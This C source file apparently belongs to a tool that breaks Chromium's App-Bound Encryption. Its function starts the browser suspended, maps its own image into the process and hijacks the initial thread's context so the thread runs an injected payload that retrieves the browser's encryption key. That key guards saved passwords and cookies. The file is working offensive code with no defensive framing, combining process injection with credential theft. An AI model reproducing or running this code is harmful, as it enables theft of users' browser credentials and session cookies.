#include "AbeDecrypt.h"

/*** method: Hijack (suspended browser initial thread redirected to our payload) ***/

_Success_(return != FALSE)
BOOL
AbeGetKeyHijack(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = (PVOID)&__ImageBase;
    PROCESS_INFORMATION Pi;
    CONTEXT Ctx = { 0 };
    PVOID Mapped = NULL;
    LONG Code = (LONG)E_FAIL;

    if (!AbePrepareRequest(Browser))
    {
        return FALSE;
    }
    if (!AbeCreateBrowserProcess(Browser->ExePath, CREATE_SUSPENDED, &Pi))
    {
        AbeLog(L"Hijack: failed to create browser process, gle=%lu\r\n", Err_GetLastError());
        return FALSE;
    }

    if (AbeMapSelf(Pi.hProcess, &Mapped))
    {
        Ctx.ContextFlags = CONTEXT_CONTROL;
        if (NT_SUCCESS(NtGetContextThread(Pi.hThread, &Ctx)))
        {
            Ctx.CONTEXT_PC = (ULONG_PTR)((PBYTE)Mapped +
                                         ((ULONG_PTR)AbeHijackEntry - (ULONG_PTR)Self));
            if (NT_SUCCESS(NtSetContextThread(Pi.hThread, &Ctx)))
            {
                NtResumeThread(Pi.hThread, NULL);
                Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
            }
        }
    }
    if (Code != 0)
    {
        AbeLog(L"Hijack: payload failed, hr=0x%08lX\r\n", (unsigned long)Code);
    }

    NtTerminateProcess(Pi.hProcess, 0);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    return Code == 0;
}
